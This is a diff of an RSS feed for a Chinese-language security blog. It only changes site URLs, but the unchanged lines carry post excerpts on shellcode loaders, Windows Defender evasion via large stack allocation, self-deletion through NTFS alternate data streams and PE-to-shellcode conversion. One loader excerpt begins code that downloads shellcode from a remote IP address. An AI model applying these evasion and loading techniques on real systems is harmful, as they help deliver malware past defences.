@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>code on 2867a0</title>
-    <link>https://gokarna-hugo.netlify.app/tags/code/</link>
+    <link>https://2867a0.github.io/tags/code/</link>
     <description>Recent content in code on 2867a0</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sun, 11 Jun 2023 08:18:00 +0800</lastBuildDate><atom:link href="https://gokarna-hugo.netlify.app/tags/code/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 11 Jun 2023 08:18:00 +0800</lastBuildDate><atom:link href="https://2867a0.github.io/tags/code/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>利用ADS删除自身</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/adsdeleteself/</link>
+      <link>https://2867a0.github.io/posts/2023/adsdeleteself/</link>
       <pubDate>Sun, 11 Jun 2023 08:18:00 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/adsdeleteself/</guid>
+      <guid>https://2867a0.github.io/posts/2023/adsdeleteself/</guid>
       <description>ADS Microsoft于90年代初期引入了一种称为“数据流”的概念，从而使NTFS可以作为Macintosh客户端访问文件服务器的文件系统。因为Mac OS 是利用Mac的分层式文件系统（HFS)上所谓的资源分支数据流，用于存放图标等应用程序的元数据。NTFS和FAT的差别就是FAT由一个数据流构成，而NTFS可以在一个文件内存里面存储多个数据流。
 在windows协议MS-FSA中ADS的定义：一个被命名的数据流是一个文件或者目录的一部分，它们可以独立于默认数据流被单独的打开。许多数据流的操作之影响数据流并不影响其他数据流，文件和目录
 所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：
@@ -35,10 +35,10 @@ notepad.exe 1.txt::$DATA 简单提一下，用微软的streams.exe工具可以�
     
     <item>
       <title>Write Memory Trick</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/writememorytrick/</link>
+      <link>https://2867a0.github.io/posts/2023/writememorytrick/</link>
       <pubDate>Wed, 22 Mar 2023 07:12:30 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/writememorytrick/</guid>
+      <guid>https://2867a0.github.io/posts/2023/writememorytrick/</guid>
       <description>[TOC]
 vx-underground档案中记载的技巧，用一些非常见的函数写入shellcode到内存。原文来自xss.is论坛，这里只记录复现出来的函数。
 PathCanonicalizeA 源代码如下，首先HeapCreate()、HeapAlloc()分配dst_shellcode内存空间，使用PathCanonicalizeA()函数将源shellcode逐字节复制到dst_shellcode，修改dst_shellcode内存空间权限为RWX，最后调用**InitOnceExecuteOnce()**执行。
@@ -48,10 +48,10 @@ PathCanonicalizeA函数在使用的时候有两个问题，一是遇到0x00字�
     
     <item>
       <title>Pe To Shellcode</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/petoshellcode/</link>
+      <link>https://2867a0.github.io/posts/2023/petoshellcode/</link>
       <pubDate>Fri, 03 Mar 2023 08:00:00 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/petoshellcode/</guid>
+      <guid>https://2867a0.github.io/posts/2023/petoshellcode/</guid>
       <description>原项目地址
 pe2shc 先把它转成vs项目，程序入口接受两个参数，待转换文件和转换后文件输出路径
 首先执行的是is_supported_pe()函数。读取源文件，按照内存对齐方式将数据读取到内存，判断是否为可以转换的程序
@@ -71,10 +71,10 @@ NT头+176指向的是BaseRelocationTable的首地址，确保重定位表存在�
     
     <item>
       <title>Big Stack bypass</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2023/bigstack/</link>
+      <link>https://2867a0.github.io/posts/2023/bigstack/</link>
       <pubDate>Mon, 13 Feb 2023 08:00:00 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2023/bigstack/</guid>
+      <guid>https://2867a0.github.io/posts/2023/bigstack/</guid>
       <description>[TOC]
 2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。
 测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。
@@ -85,10 +85,10 @@ visual studio编译需要设置字符集为多字节、堆栈提交大小为2000
     
     <item>
       <title>回调函数加载器</title>
-      <link>https://gokarna-hugo.netlify.app/posts/2022/callback-function/</link>
+      <link>https://2867a0.github.io/posts/2022/callback-function/</link>
       <pubDate>Sun, 13 Nov 2022 22:53:46 +0800</pubDate>
       
-      <guid>https://gokarna-hugo.netlify.app/posts/2022/callback-function/</guid>
+      <guid>https://2867a0.github.io/posts/2022/callback-function/</guid>
       <description>是github项目AlternativeShellcodeExec中提到的一些函数可以用来执行shellcode
 项目里面还有很多函数可以利用，因为是在本地线程执行shellcode的，所以这里只贴出其中一个完整的利用代码
 #include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;wincrypt.h&amp;gt; #include &amp;lt;WinInet.h&amp;gt; #pragma comment(lib, &amp;#34;WinInet.lib&amp;#34;) // Requires Crypt32.lib // 需要在链接器 -&amp;gt; 输入 -&amp;gt; 附加依赖项 中添加如下库 /* kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Crypt32.lib */ // 定义结构体 typedef struct { char* shellcode; int size; } SHELLCODO, * PSHELLCODE; BOOL downloadShellcode(LPCWSTR url, int port, LPCWSTR payloadPath, BOOL isEncrypted, PSHELLCODE pShellcode); int main() { SHELLCODO shellcode = { 0 }; BOOL s = downloadShellcode(L&amp;#34;192.</description>
